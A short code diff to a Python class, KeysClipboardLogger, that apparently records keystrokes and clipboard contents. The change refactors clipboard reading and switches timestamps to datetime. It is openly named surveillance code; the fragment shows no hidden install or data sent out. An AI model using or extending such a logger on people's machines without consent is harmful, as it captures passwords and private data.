@@ -8,7 +8,7 @@
 # Library imports here
 import keyboard as kb
 import pyperclip as pc
-import time
+from datetime import datetime
 
 
 # Main code here
@@ -44,13 +44,18 @@ class KeysClipboardLogger:
             return False
 
     def log_clipboard(self):
-        if type(self.current_clipboard) != str:
+        try:
+            text = pc.paste()
+        except pc.PyperclipException:
+            text = None
+
+        if text is None:
             data = "Clipboard contained non-string item."
         else:
             # Return only the important data, make one writerow in moso.py
             self.old_clipboard = self.current_clipboard
             data = self.current_clipboard
-        return time.time(), data
+        return datetime.now(), data
 
     def start_keylogger(self):
 
